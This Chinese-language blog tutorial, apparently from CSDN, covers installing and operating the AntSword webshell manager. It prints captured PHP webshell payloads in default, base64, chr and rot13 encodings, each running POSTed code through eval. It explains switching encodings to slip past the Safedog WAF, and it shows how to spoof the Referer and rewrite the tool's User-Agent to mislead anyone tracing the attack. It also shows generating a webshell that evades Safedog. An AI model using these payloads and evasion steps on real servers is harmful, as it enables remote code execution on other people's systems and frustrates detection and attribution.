加载器：
https://github.com/AntSwordProject/AntSword-Loader

核心源码：
https://github.com/AntSwordProject/antSword

如果从github上下载很卡，可以去复制链接到githubd上下载
[https://githubd.com](https://githubd.com/)

中国蚁剑使用说明书：
[https://doc.u0u.us/zh-hans/](https://doc.u0u.us/zh-hans/index.html)

# 安装教程

将两个文件下载好后，解压。进入加载器目录（AntSword-Loader-v4.0.3-win32-x64），打开AntSword.exe。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819170127274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
加载器页面：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819170210945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
如果我们根据提示，选择一个空的目录去初始化，那么他会自动去下载源码。
不过源码已经不在了，会出现以下情况（404）。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819170323319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819170335146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
将初始化选择源码包antSword目录（前面我们下载的核心源码），初始化后会自动重启，再次打开就可以使用了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819170555509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819171327624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)

# 使用教程

右键页面空白处，添加数据。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820110213422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
输入木马地址及密码，添加保存。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820112233651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)

## 抓取数据包分析

设置蚁剑代理：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820142959897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
Burp Suite：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820143017355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)

## 设置编码方式

在添加shell和修改时都可以进行编码，修改编码相当于连接时修改了连接方式，这样就可以绕过WAF了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200824094324836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)

根据上面的代理设置进行抓包，连接时拦截，可看见连接传输的内容（tiger为我的密码）。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820153036781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)

default:

```
tiger=@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return str_rot13($out);};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "c8b5a";echo @asenc($output);echo "ad3f9";}ob_start();try{$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);$R="{$D}	";if(substr($D,0,1)!="/"){foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";}else{$R.="/";}$R.="	";$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";$s=($u)?$u["name"]:@get_current_user();$R.=php_uname();$R.="	{$s}";echo $R;;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();
1
```

base64:

```
_0xe5c436e26d9c2=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuIHN0cl9yb3QxMygkb3V0KTt9O2Z1bmN0aW9uIGFzb3V0cHV0KCl7JG91dHB1dD1vYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTtlY2hvICI3ODE4OCI7ZWNobyBAYXNlbmMoJG91dHB1dCk7ZWNobyAiMmRhYmQiO31vYl9zdGFydCgpO3RyeXskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfQkiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkMiLCJaIilhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fWVsc2V7JFIuPSIvIjt9JFIuPSIJIjskdT0oZnVuY3Rpb25fZXhpc3RzKCJwb3NpeF9nZXRlZ2lkIikpP0Bwb3NpeF9nZXRwd3VpZChAcG9zaXhfZ2V0ZXVpZCgpKToiIjskcz0oJHUpPyR1WyJuYW1lIl06QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIJeyRzfSI7ZWNobyAkUjs7fWNhdGNoKEV4Y2VwdGlvbiAkZSl7ZWNobyAiRVJST1I6Ly8iLiRlLT5nZXRNZXNzYWdlKCk7fTthc291dHB1dCgpO2RpZSgpOw==&tiger=@eval(@base64_decode($_POST[_0xe5c436e26d9c2]));
1
```

chr:

```
tiger=@eVAl(cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116).ChR(40).ChR(34).ChR(100).ChR(105).ChR(115).ChR(112).ChR(108).ChR(97).ChR(121).ChR(95).ChR(101).ChR(114).ChR(114).ChR(111).ChR(114).ChR(115).ChR(34).ChR(44).ChR(32).ChR(34).ChR(48).ChR(34).ChR(41).ChR(59).ChR(64).ChR(115).ChR(101).ChR(116).ChR(95).ChR(116).ChR(105).ChR(109).ChR(101).ChR(95).ChR(108).ChR(105).ChR(109).ChR(105).ChR(116).ChR(40).ChR(48).ChR(41).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(41).ChR(123).ChR(114).ChR(101).ChR(116).ChR(117).ChR(114).ChR(110).ChR(32).ChR(115).ChR(116).ChR(114).ChR(95).ChR(114).ChR(111).ChR(116).ChR(49).ChR(51).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(41).ChR(59).ChR(125).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(123).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(61).ChR(111).ChR(98).ChR(95).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(111).ChR(110).ChR(116).ChR(101).ChR(110).ChR(116).ChR(115).ChR(40).ChR(41).ChR(59).ChR(111).ChR(98).ChR(95).ChR(101).ChR(110).ChR(100).ChR(95).ChR(99).ChR(108).ChR(101).ChR(97).ChR(110).ChR(40).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(56).ChR(49).ChR(56).ChR(57).ChR(99).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(64).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(99).ChR(102).ChR(56).ChR(51).ChR(50).ChR(34).ChR(59).ChR(125).ChR(111).ChR(98).ChR(95).ChR(115).ChR(116).ChR(97).ChR(114).ChR(116).ChR(40).ChR(41).ChR(59).ChR(116).ChR(114).ChR(121).ChR(123).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(83).ChR(67).ChR(82).ChR(73).ChR(80).ChR(84).ChR(95).ChR(70).ChR(73).ChR(76).ChR(69).ChR(78).ChR(65).ChR(77).ChR(69).ChR(34).ChR(93).ChR(41).ChR(59).ChR(105).ChR(102).ChR(40).ChR(36).ChR(68).ChR(61).ChR(61).ChR(34).ChR(34).ChR(41).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(80).ChR(65).ChR(84).ChR(72).ChR(95).ChR(84).ChR(82).ChR(65).ChR(78).ChR(83).ChR(76).ChR(65).ChR(84).ChR(69).ChR(68).ChR(34).ChR(93).ChR(41).ChR(59).ChR(36).ChR(82).ChR(61).ChR(34).ChR(123).ChR(36).ChR(68).ChR(125).ChR(9).ChR(34).ChR(59).ChR(105).ChR(102).ChR(40).ChR(115).ChR(117).ChR(98).ChR(115).ChR(116).ChR(114).ChR(40).ChR(36).ChR(68).ChR(44).ChR(48).ChR(44).ChR(49).ChR(41).ChR(33).ChR(61).ChR(34).ChR(47).ChR(34).ChR(41).ChR(123).ChR(102).ChR(111).ChR(114).ChR(101).ChR(97).ChR(99).ChR(104).ChR(40).ChR(114).ChR(97).ChR(110).ChR(103).ChR(101).ChR(40).ChR(34).ChR(67).ChR(34).ChR(44).ChR(34).ChR(90).ChR(34).ChR(41).ChR(97).ChR(115).ChR(32).ChR(36).ChR(76).ChR(41).ChR(105).ChR(102).ChR(40).ChR(105).ChR(115).ChR(95).ChR(100).ChR(105).ChR(114).ChR(40).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(41).ChR(41).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(59).ChR(125).ChR(101).ChR(108).ChR(115).ChR(101).ChR(123).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(47).ChR(34).ChR(59).ChR(125).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(34).ChR(59).ChR(36).ChR(117).ChR(61).ChR(40).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(95).ChR(101).ChR(120).ChR(105).ChR(115).ChR(116).ChR(115).ChR(40).ChR(34).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(103).ChR(105).ChR(100).ChR(34).ChR(41).ChR(41).ChR(63).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(112).ChR(119).ChR(117).ChR(105).ChR(100).ChR(40).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(117).ChR(105).ChR(100).ChR(40).ChR(41).ChR(41).ChR(58).ChR(34).ChR(34).ChR(59).ChR(36).ChR(115).ChR(61).ChR(40).ChR(36).ChR(117).ChR(41).ChR(63).ChR(36).ChR(117).ChR(91).ChR(34).ChR(110).ChR(97).ChR(109).ChR(101).ChR(34).ChR(93).ChR(58).ChR(64).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(117).ChR(114).ChR(114).ChR(101).ChR(110).ChR(116).ChR(95).ChR(117).ChR(115).ChR(101).ChR(114).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(112).ChR(104).ChR(112).ChR(95).ChR(117).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(123).ChR(36).ChR(115).ChR(125).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(36).ChR(82).ChR(59).ChR(59).ChR(125).ChR(99).ChR(97).ChR(116).ChR(99).ChR(104).ChR(40).ChR(69).ChR(120).ChR(99).ChR(101).ChR(112).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(36).ChR(101).ChR(41).ChR(123).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(69).ChR(82).ChR(82).ChR(79).ChR(82).ChR(58).ChR(47).ChR(47).ChR(34).ChR(46).ChR(36).ChR(101).ChR(45).ChR(62).ChR(103).ChR(101).ChR(116).ChR(77).ChR(101).ChR(115).ChR(115).ChR(97).ChR(103).ChR(101).ChR(40).ChR(41).ChR(59).ChR(125).ChR(59).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(59).ChR(100).ChR(105).ChR(101).ChR(40).ChR(41).ChR(59));
1
```

rot13:

```
_0xb7628defadc01=@vav_frg("qvfcynl_reebef", "0");@frg_gvzr_yvzvg(0);shapgvba nfrap($bhg){erghea fge_ebg13($bhg);};shapgvba nfbhgchg(){$bhgchg=bo_trg_pbagragf();bo_raq_pyrna();rpub "no03q";rpub @nfrap($bhgchg);rpub "99nr7";}bo_fgneg();gel{$Q=qveanzr($_FREIRE["FPEVCG_SVYRANZR"]);vs($Q=="")$Q=qveanzr($_FREIRE["CNGU_GENAFYNGRQ"]);$E="{$Q}	";vs(fhofge($Q,0,1)!="/"){sbernpu(enatr("P","M")nf $Y)vs(vf_qve("{$Y}:"))$E.="{$Y}:";}ryfr{$E.="/";}$E.="	";$h=(shapgvba_rkvfgf("cbfvk_trgrtvq"))?@cbfvk_trgcjhvq(@cbfvk_trgrhvq()):"";$f=($h)?$h["anzr"]:@trg_pheerag_hfre();$E.=cuc_hanzr();$E.="	{$f}";rpub $E;;}pngpu(Rkprcgvba $r){rpub "REEBE://".$r->trgZrffntr();};nfbhgchg();qvr();&tiger=@eval(@str_rot13($_POST[_0xb7628defadc01]));
1
```

## 绕过安全狗连接

使用default连接是会被安全狗拦截的。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820172226627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
修改成chr16编码连接

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820172442400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
测试连接：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820172513956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820172642371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
当然，如果🐎好的话，不需要进行编码也能链接，后面安装插件时会演示到。

## 请求包修改

编辑数据和添加数据时可以看到请求信息这个选项。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200822152820774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)

这些细节设置，可以自行添加一些Referer等请求字段等，稍微误导一下溯源者方向。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200822153120690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
还有一个关键信息需要我们清除，就是请求包中的User-Agent，这一特征就很明显我们在使用蚁剑这个工具。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200822155033614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
我们需要修改两个地方

```bash
#google浏览器标识符
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.36
12
#路径
antSword\modules\request.js 
12
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200822215556687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)

```bash
#修改成
const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.36' ; 
12
#路径
antSword\modules\update.js 
12
```

搜索“User-Agent”，按照上面操作修改掉 “antSword/v2.0”。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200822160107960.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
重启应用之后再次连接shell，可以看到User-Agent和我们修改的一样了。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200822221638999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)

# 插件安装

AntSword->插件市场
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020082101165619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)

## 插件中心

如果直接去访问的话，会很卡（反正我是访问不了…）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819172336616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
需要科学上网，设置好你的代理后，保存重启。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820093718704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820093649131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)

## 使用插件

右键就可以看到自己安装的插件。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820102735115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
生成shell：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820151124564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820151107534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
安全狗查杀时，未发现木马，所以测试连接时不用编码就能绕过。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200821005854397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
但D盾能查杀
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200820151050349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)
毕竟插件也出久了，使用也泛滥了，不过大家可以学学这个插件作者的思路。在插件中心右上角有项目源码。
![在这里插入图片描述](https://img-blog.csdnimg.cn/2020082101090393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTkyNDc2NA==,size_16,color_FFFFFF,t_70#pic_center)